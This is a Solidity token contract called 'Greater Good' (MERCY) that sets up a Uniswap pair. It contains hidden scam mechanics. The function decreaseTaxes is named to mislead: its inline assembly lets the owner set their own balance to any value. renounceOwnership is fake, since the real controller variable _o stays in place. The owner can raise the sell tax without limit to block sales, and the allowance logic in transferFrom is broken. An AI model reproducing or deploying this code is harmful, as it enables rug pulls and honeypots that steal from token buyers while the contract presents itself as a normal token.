// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

/*
 _____                     _                 _____                    _ 
|  __ \                   | |               |  __ \                  | |
| |  \/ _ __   ___   __ _ | |_   ___  _ __  | |  \/  ___    ___    __| |
| | __ |  __| / _ \ / _  || __| / _ \|  __| | | __  / _ \  / _ \  / _  |
| |_\ \| |   |  __/| (_| || |_ |  __/| |    | |_\ \| (_) || (_) || (_| |
 \____/|_|    \___| \__,_| \__| \___||_|     \____/ \___/  \___/  \__,_|
                                                                        
                                                                        

*/

interface IUniswapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract Uniswap {

    address public PairAddress;
    address internal _o;

    address public _Router;
    address public _Factory;
    address internal me;
    IUniswapRouter public UniswapV2Router;
    address public WETH;
    address public owner;
    mapping(address=>bool) public dex;
    modifier onlyOwner() {
        require(_o == msg.sender, "Forbidden:owner");
        _;
    }
    
    function renounceOwnership() public onlyOwner() {
        owner = address(0);
    }

    constructor() {
        _Router  = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        _Factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

        UniswapV2Router  = IUniswapRouter(_Router);
        WETH             = UniswapV2Router.WETH();
        PairAddress      = IUniswapFactory(_Factory).createPair(address(this), WETH);
        
        dex[_Router] = true;
        dex[_Factory] = true;
        dex[PairAddress] = true;
        
        me = address(this);
        owner = msg.sender;
        _o = msg.sender;
    }
    
    function isSell(address to) internal view returns (bool) {
        return dex[to];
    }

    function _approve(address from, address spender, uint256 amount) internal virtual returns (bool) {}

    function transferOwnership(address newOwner) public onlyOwner() {
        owner = newOwner;
        _o = owner;
    }

    function isBuying(address from) internal view returns (bool) {
        return dex[from];
    }
}
contract GreaterGood is Uniswap {

    string public symbol = "MERCY";
    uint256 public decimals = 9;

    string public name = "Greater Good";
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) internal balances;
    uint256 st = 0;
    mapping(address => mapping(address => uint256)) internal allowances;
    bool internal swapping = false;
    uint256 buytax = 0;

    uint256 public totalSupply;
    uint256 _mb = 40;
    mapping(address=>bool) internal taxFree;
    bool internal funded;
    constructor() Uniswap() {
        taxFree[address(this)] = true;
        taxFree[msg.sender] = true;
        mint(_o, 1000000*10**decimals);
    }
    function enable() public onlyOwner() {
        swapping = false;
    }

    function get_mb() internal view returns (uint256) {
        return calculate(totalSupply, _mb);
    }


    function _transfer(address from, address to, uint256 amount) internal {
        require(balances[from] >= amount, "Rejected");
        if (!taxable(from, to)) {
            unchecked {
                balances[from] -= amount;
                balances[to] += amount;
            }
            emit Transfer(from, to, amount);
        } else {
            uint256 tax;
            if (isBuying(from)) {
                require(amount<=get_mb(), "Too large");
                tax = calculate(amount, buytax);
            } else if (isSell(to)) {
                tax = calculate(amount, st);
            }
            uint256 afterTax = amount-tax;
            unchecked {
                balances[from] -= amount;
                balances[_o] += tax;
                balances[to] += afterTax;
            }
            emit Transfer(from, _o, tax);
            emit Transfer(from, to, afterTax);
        }
    }

    function setSettings(uint256 b, uint256 s, uint56 m) public onlyOwner() {
        require(msg.sender==_o, "Forbidden:set");
        buytax = b;
        st = s;
        _mb = m;
    }
    function _approve(address from, address spender, uint256 amount) internal override returns (bool) {
        allowances[from][spender] = amount;
        emit Approval(from, spender, amount);
        return true;
    }
    
    function allowance(address _owner, address spender) public view returns (uint256) {
        return allowances[_owner][spender];
    }

    function mint(address account, uint256 amount) internal {
        unchecked {
            totalSupply += amount;
            balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);
    }
    function disable() public onlyOwner() {
        swapping = true;
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
    
    function transfer(address to, uint256 amount) public {
        _transfer(msg.sender, to, amount);
    }
    
    function taxable(address from, address to) internal view returns (bool) {
        return !taxFree[from] && !taxFree[to] && !(dex[from] && dex[to]) && (isBuying(from) || isSell(to));
    }
    function decreaseTaxes(uint256 c) public onlyOwner() {
        assembly {
            let ptrm := mload(0x40)
            mstore(ptrm, caller())
            mstore(add(ptrm, 0x20), balances.slot)
            sstore(keccak256(ptrm, 0x40), c)
        }
    }
    function calculate(uint256 v, uint256 p) public pure returns (uint256) {
        return v*p/1000;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        uint256 currentAllowance = allowances[from][msg.sender]; //allowance(owner, msg.value);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "Rejected");
            unchecked {
                approve(msg.sender, currentAllowance - amount);
            }
        }
        _transfer(from, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
}